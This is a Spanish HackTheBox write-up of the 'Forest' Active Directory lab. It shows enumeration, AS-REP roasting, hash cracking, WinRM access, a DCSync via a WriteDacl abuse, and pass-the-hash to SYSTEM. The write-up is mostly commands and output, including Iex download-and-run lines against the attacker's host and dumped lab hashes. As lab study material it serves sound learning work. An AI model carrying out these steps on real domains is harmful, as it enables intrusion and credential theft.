---
layout      : post
title       : "Maquina Forest - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Forest/forest.png
category    : [ hackthebox ]
tags        : [ RPC Enumeration, AS-RepRoast attack, Cracking Hashes, Abusing WinRM, BloodHound Enumeration,Gathering system information, Abusing Account Operators Group, Abusing WriteDacl, DCSync Exploitation ]
---

El dia de hoy vamos a resolver `Forest` de `hackthebox` una maquina `windows` de dificultad facil, en esta ocasión vamos a enfrentarnos contra un `DC` donde enumeraremos usuarios a traves de `rpc` y mediante un `As-RepRoast attack` solicitando un `TGT` obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por `winrm` a el equipo; despues enumerando el sistema con `Bloodhound` nos aprovecharemos de los permisos del grupo `Account Operators` para crear un usuario en el dominio y efectuar un `Dcsync attack` donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario `Administrator`. 
    
Maquina curiosa asi que vamos a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Forest
❯ ls

 Forest
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.161/113.161/113.161/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127` y por proximidad seria correspondiente a una maquina `windows`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 11:56 -05
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.161 [65535 ports]
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-09 11:56:58 -05 for 21s
Not shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49934/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
           Raw packets sent: 104093 (4.580MB) | Rcvd: 86582 (3.463MB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
# Nmap 7.93 scan initiated Mon Oct  9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49934/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-10-09T10:06:39-07:00
| smb2-time: 
|   date: 2023-10-09T17:06:35
|_  start_date: 2023-10-09T14:03:53
|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78.92 seconds
```

Entre los puertos abiertos mas relevantes podemos visualizar:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 53     | DNS     |  Simple DNS Plus|
| 88  | KERBEROS     | Microsoft Windows Kerberos  |
| 135   |  MSRPC     |  Microsoft Windows RPC  |
| 139   | NETBIOS     |  Microsoft Windows netbios-ssn|
| 389   | LDAP     |  Microsoft Windows Active Directory LDAP  |
| 445   |   SMB   | Windows Server 2016 Standard  |
| 3268   |   LDAP   |  Microsoft Windows Active Directory LDAP  |
| 5985   |  WINRM    | Microsoft HTTPAPI httpd 2.0   |



## EXPLOTACION [#](#explotacion) {#explotacion}

Como vemos que el puerto `445` esta abierto, con `crackpamexec` podemos tratar de enumerar a lo que nos enfrentamos.

```bash
❯ crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

Vemos que nos enfrentamos a un `Windows Server 2016` y que el `smb` esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.161 htb.local" >> /etc/hosts
```

Ahora al tratarse de un `Domain Controller` podemos tratar de enumerar usuarios validos con `rpclient` a traves de un `null session`.

```bash
❯ rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Como tenemos un listado potencial de usuarios, podemos tratar de efectuar un `ASREProast Attack` para tratar de obtener un `TGT - ticket granting ticket` que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo.

```bash
❯ GetNPUsers.py -no-pass -usersfile users htb.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Procedemos a crackear el hash y obtenemos unas credenciales `svc-alfresco:s3rvice`

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2023-10-11 14:27) 0.1510g/s 617184p/s 617184c/s 617184C/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Validamos las credenciales y como el puerto `5985` se encuentra abierto podemos tratar de conectarnos por `winrm`

```bash
❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario `svc-alfresco` y podemos visualizar la primera flag `user.txt`

```bash
❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
a5bdfec1b06f0a66536a4227d3dfc27d
```

## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}


Como nos enfrentamos a un `DC` vamos a usar `BloodHound` para tratar de enumerar vias potenciales para elevar nuestros privilegios.

Para instalarlos solo debemos ejecutar:

```bash
apt install neo4j, bloodhound -y
```

Si tienes problemas con la instalación puedes instalar una versión especifica de `neo4j` de:

* [https://debian.neo4j.com/](https://debian.neo4j.com/)

y puedes descargar un release de `bloodhound` directamente del repositorio de github:

* [BloodHound - releases](https://github.com/BloodHoundAD/BloodHound/releases)


Una vez instalado ejecuta el comando `neo4j console` y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto `neo4j:no4oj` y te pedira cambies la contraseña por defecto a la que desees.

```bash
❯ neo4j console
Starting Neo4j.
2023-10-11 20:21:29.970+0000 INFO  Starting...
2023-10-11 20:21:30.757+0000 INFO  This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)
2023-10-11 20:21:33.391+0000 INFO  ======== Neo4j 4.4.26 ========
2023-10-11 20:21:36.106+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-10-11 20:21:36.659+0000 INFO  Bolt enabled on localhost:7687.
2023-10-11 20:21:37.946+0000 INFO  Remote interface available at http://localhost:7474/
```

![](/assets/images/HTB/htb-writeup-Forest/forest1.PNG)


Estas credenciales seran la que usaras para logearte al abrir `Bloodhound`.

![](/assets/images/HTB/htb-writeup-Forest/forest2.PNG)


Ahora descargaremos el script de powershell `sharphound.ps1` que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al `bloodhound`.

 * [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)


Subimos el script y lo interpretamos con `Iex`.


```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> mkdir bloodhound

    Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/11/2023   2:46 PM                bloodhound


Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cd bloodhound
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/SharpHound.ps1')
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> Invoke-BloodHound -CollectionMethod All
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> dir

    Directory: C:\Users\svc-alfresco\Desktop\bloodhound

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/11/2023   2:48 PM          15433 20231011144852_BloodHound.zip
-a----       10/11/2023   2:48 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```

Nos traemos el archivo a nuestro equipo y lo importamos en el `Bloodhound`.


```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip to 20231011144852_BloodHound.zip
                                        
Info: Download successful!
```

Le asignamos un nombre mas descriptivo al comprimido.

```bash
❯ ls
 20231011144852_BloodHound.zip   hash   SharpHound.ps1   users
❯ mv 20231011144852_BloodHound.zip bh_data.zip
❯ ls
 bh_data.zip   hash   SharpHound.ps1   users
```


Ahora lo subimos al `BloodHound`.

![](/assets/images/HTB/htb-writeup-Forest/forest3.PNG)

Como comprometimos al usuario `svc-alfresco` vamos a marcarlo como comprometido.

![](/assets/images/HTB/htb-writeup-Forest/forest4.PNG)


Vemos que el usuario alfresco esta dentro del grupo `Account Operators` y este tiene el privilegio `GenericAll` sobre `Exchange Windows Permissions`, que a su vez tiene `WriteDacl` sobre `htb.local`.


![](/assets/images/HTB/htb-writeup-Forest/forest5.PNG)

Estando dentro del grupo `Account Operators` podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo `Exchange Windows Permissions`.

```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> net user fmiracle fmiracle123$! /add /domain
The command completed successfully.

Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> net group "Exchange Windows Permissions" fmiracle /add
The command completed successfully.
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> net user fmiracle
User name                    fmiracle
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/11/2023 3:29:16 PM
Password expires             Never
Password changeable          10/12/2023 3:29:16 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio `WriteDacl` y ejecutar un `Dcsync Attack`, para ello ejecutamos los siguientes comandos.


```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -Force
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
```

Despues vamos a descargarnos e importar el modulo de `PowerView.ps1`.

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.161 - - [11/Oct/2023 17:32:48] "GET /PowerView.ps1 HTTP/1.1" 200 -
```

```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/PowerView.ps1')
```
Finalmente ejecutamos la función `Add-DomainObjectAcl` del `PowerView.ps1` que importamos.

```bash
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity fmiracle -Rights DCSync
```

Y ahora en nuestro equipo podemos usar `secretdump` usando las credenciales del usuario `fmiracle` y podemos dumpearnos todos los hashes del dominio.

```bash
❯ secretsdump.py htb.local/fmiracle@10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid
[*] Dumping Domain Credentials 
[*] Using the DRSUAPI method to get NTDS.DIT secret
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Aplicamos `pass the hash` con `psexec.py` para conectarnos como el usuario `Administrator`, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag `root.txt`.


```bash
❯ psexec.py htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file bUDVoWTk.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service jeFE on 10.10.10.161.....
[*] Starting service jeFE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
84831d87fd5fe84052c8fb99dd4b9c5
```
